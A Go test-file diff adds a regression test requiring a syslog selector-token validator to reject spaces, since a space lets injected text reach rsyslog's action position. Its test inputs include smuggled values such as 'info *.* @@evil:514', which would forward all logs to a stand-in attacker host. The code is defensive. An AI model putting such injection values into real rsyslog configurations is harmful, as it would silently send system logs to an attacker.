@@ -85,3 +85,32 @@ func TestSyslogSelectorTokenAcceptsJunosVocabulary_5797(t *testing.T) {
 		}
 	}
 }
+
+// TestSyslogSelectorTokenSpaceIsUnsafe_5797 pins the specific byte the
+// reachability trace turned on. A literal newline cannot reach these tokens —
+// the lexer normalizes \n and \t inside a quoted value to a SPACE — so the
+// belt's value does not rest on newline rejection. It rests on rejecting the
+// space, because the emitted line is `<facility>.<severity>\t<target>` and
+// rsyslog's grammar is `<selector><whitespace><action>`: a space inside the
+// token is what lets attacker-chosen text reach the ACTION position.
+//
+// If a future edit relaxes this to "printable ASCII" or "no control bytes",
+// the belt still rejects newlines (which were never reachable) while admitting
+// the space (which is), i.e. it would look correct and guard nothing. This
+// test fails on exactly that relaxation.
+func TestSyslogSelectorTokenSpaceIsUnsafe_5797(t *testing.T) {
+	for _, tok := range []string{
+		"daemon local7",
+		"* @@collector.example:514",
+		"info *.* @@evil:514",
+		" ",
+		"daemon ",
+	} {
+		if syslogSelectorTokenSafe(tok) {
+			t.Errorf("token %q accepted: a SPACE separates the rsyslog selector from its "+
+				"action, so this reaches the action position of a managed drop-in. The "+
+				"newline this belt appears to guard is NOT reachable (the lexer folds it "+
+				"to a space) — the space is the live byte (#5797)", tok)
+		}
+	}
+}
